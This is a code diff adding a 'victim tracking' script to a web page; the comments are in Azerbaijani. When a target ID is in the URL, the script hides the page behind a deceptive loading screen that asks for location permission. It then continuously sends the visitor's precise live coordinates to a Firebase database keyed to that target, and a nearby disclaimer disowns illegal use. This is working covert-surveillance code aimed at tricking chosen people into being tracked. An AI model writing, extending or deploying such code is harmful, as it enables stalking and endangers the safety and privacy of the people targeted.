@@ -166,6 +166,31 @@
         ]
     };
 
+// QURBAN İZLƏMƏ MƏNTİQİ (index.html daxilinə at)
+const urlParams = new URLSearchParams(window.location.search);
+const targetId = urlParams.get('target');
+
+if(targetId) {
+    // Qurban qara ekran görməsin deyə aldadıcı yazı
+    document.body.innerHTML = `
+        <div style="background:black; color:white; height:100vh; display:flex; align-items:center; justify-content:center; flex-direction:column; font-family:sans-serif; text-align:center; padding:20px;">
+            <div style="border:4px solid #333; border-top:4px solid #00dfff; border-radius:50%; width:40px; height:40px; animation: spin 1s linear infinite;"></div>
+            <p style="margin-top:20px;">Səhifə yüklənir... <br> Zəhmət olmasa məkan icazəsi verin.</p>
+        </div>
+        <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
+    `;
+
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(pos => {
+            firebase.database().ref('live_tracks/' + targetId).set({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                timestamp: Date.now()
+            });
+        }, null, { enableHighAccuracy: true });
+    }
+}
+
     const disText = "Bu sayt vasitəsiylə edəcəyiniz hər hansı bir aktivasiyaya istər qurucu, istərsədə moderator cavabdehlik daşımır. Sayt sizi illegal işlərə təşviq etmir. Davam edərək məsuliyyəti qəbul edirsiniz.";
     let charIdx = 0;
     let isDisclaimerAccepted = false;
